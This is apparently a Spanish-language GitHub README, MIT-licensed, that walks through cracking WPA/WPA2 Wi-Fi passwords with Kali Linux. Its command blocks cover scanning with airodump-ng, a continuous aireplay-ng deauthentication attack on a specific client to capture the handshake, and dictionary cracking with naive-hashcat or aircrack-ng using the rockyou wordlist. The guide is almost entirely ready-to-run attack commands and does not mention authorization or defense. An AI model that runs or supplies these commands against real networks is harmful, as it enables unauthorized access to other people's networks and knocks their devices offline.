# KaliLinux-WPA_WPA2_Hack
Contiene las instrucciones necesarias para hackear redes Wifi WPA y WPA2 


## Escaneo de Redes 

1. Escaneo de redes sercanas

```bash
airodump-ng wlan0
#ctrl + c
```
Esto veríamos:
```bash
B8:69:F4:19:95:AD  -72       69       24    0   1  270  WPA2 CCMP   PSK  STUDIO  
FC:EC:DA:E9:C1:65  -75       65        0    0   1  195  WPA2 CCMP   PSK  STUDIO1 
```


2. Monitoreo la red a atacar, indicando que guarde los datos.

```bash
# [EJEMPLO] airodump-ng -c CANAL --bssid MAC -w /root/Escritorio/ wlan0
airodump-ng -c 1 --bssid B8:69:F4:19:95:AD -w /root/Escritorio/ wlan0
```

## Ataque de desautenticación

3. desautenticar usuarios para obtener handshake

3.1. Monitoreo la red a atacar:
>Nota: toca esperar a que un dispositivo se conecte.

```bash
# [EJEMPLO] airodump-ng -c CANAL --bssid MAC wlan0
 airodump-ng -c 1 --bssid B8:69:F4:19:95:AD wlan0
```


3.2. Enviar paquetes de desautenticación

>Nota: el 0 significa enviar continuamente.

>Nota: si quiero atacar el AP, suprimo la -c y la MAC del station o cliente.

>Nota: Recomiendo atacar un cliente primero.

```bash
# [EJEMPLO] aireplay-ng -0 0 -a MAC_BSSID -c MAC_STATION wlan0
aireplay-ng -0 0 -a B8:69:F4:19:95:AD -c 88:BF:E4:2E:BC:32 wlan0
```
>Nota: debemos asegurarnos que el .cap esté en el Escritorio.


## Descifrar claves con el handshake FORMA 1

4. Cambiamos el nombre del .cap por uno que querramos

```bash
mv ./-01.cap nombre.cap
```


5. Cambiamos el formato de .cap a .hccapx

```bash
cap2hccapx.bin nombre.cap nombre.hccapx
```


6. Instalar Naive-Hashcat que es el servidor que decifrará la contraseña

```bash
sudo git clone https://github.com/brannondorsey/naive-hashcat
cd naive-hashcat
curl -L -o dicts/rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
```


7. Ejecutamos Naive-Hashcat (recuerda cambiar "nombre" por el nombre del archivo)

```bash
HASH_FILE=nombre.hccapx POT_FILE=nombre.pot HASH_TYPE=2500 ./naive-hashcat.sh
```


8. Espera a que se termine de descifrar la contraseña de la red 

Una vez que se haya descifrado la contraseña, esa cadena se agregará al archivo "nombre.pot" que se encuentra en el directorio "naive-hashcat". La palabra 
o frase que esté después del punto y coma, será la contraseña.

>El procedimiento de descifrado de contraseña puede tardar desde solo unas horas hasta varios meses.


## Descifrar claves con el handshake FORMA 2

1. Descargar un archivo de diccionario

```bash
curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
```


2. Iniciar decifrado con aircrack-ng 

```bash
aircrack-ng -a2 -b MAC -w rockyou.txt nombre.cap
```
>Nota Si quieres descifrar una red WPA en lugar de una WPA2, reemplaza "-a2" por -a.


3. Espera a que diga Key Found!



## LICENSE

MIT License

Copyright (c) 2020 Luis Angel Vanegas

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
